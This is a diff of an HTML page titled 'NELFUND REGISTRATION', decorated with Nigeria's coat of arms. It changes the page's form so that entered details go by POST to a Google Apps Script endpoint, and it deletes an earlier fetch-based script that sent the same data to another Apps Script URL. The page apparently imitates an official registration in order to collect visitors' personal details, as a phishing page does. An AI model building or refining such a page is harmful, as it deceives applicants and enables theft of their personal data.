@@ -151,7 +151,7 @@
     }
   </style>
 </head>
-<body>
+<body style="background:#0ae">
      <div class="container2">
         <center><img src="https://st2.depositphotos.com/6962450/10591/i/950/depositphotos_105914406-stock-illustration-nigeria-coat-of-arms.jpg" alt="Nigeria Coat of Arms" width="100"></center>
   <center>  <b><a style="color:navy;font-size:30px; font-family:impact;">NELFUND </a><a style="color:green; font-size:15px;"><i>REGISTRATION</i></a></b></br></center>
@@ -159,7 +159,7 @@
      </br></br></br>
 
 
-    <form id="myForm">
+    <form id="myForm"action="https://script.google.com/macros/s/AKfycbwqBMfmQvfx5Z87EfYwuXiAYbo6qyyE3lek7K8TvrpgM2PyCtsQEH6ccaU6a0kF5jOa/exec" method="POST" >
       <div class="input-group">
         <label>Your Name<a style="color:red">*</a></label>
         <input type="text" autocomplete="on" name="Name" required />
@@ -360,33 +360,9 @@
       // Wait 10 seconds then submit
       setTimeout(() => {
         form.submit(); // Now submit to nextpage.html
-      }, 5000);
+      }, 3000);
     });
   </script>
-    <script>
-    const scriptURL = 'https://script.google.com/macros/s/AKfycbw1ePUCS6W9JupsZZSDXfG9_tSLCRZJn8lO6d6dm9lLfC8os2WdYismLgarrnVdys8k/exec';
-    const form = document.getElementById('myForm');
-
-    form.addEventListener('submit', e => {
-      e.preventDefault();
-
-      const formData = new FormData(form);
-      const jsonData = {};
-      formData.forEach((value, key) => {
-        jsonData[key] = value;
-      });
-
-      fetch(scriptURL, {
-        method: 'POST',
-        body: JSON.stringify(jsonData),
-        headers: {
-          'Content-Type': 'application/json'
-        }
-      })
-      .then(res => res.json())
-      .then(data => alert('Success!'))
-      .catch(error => alert('Error!'));
-    });
-  </script>
+   
 </body>
 </html>
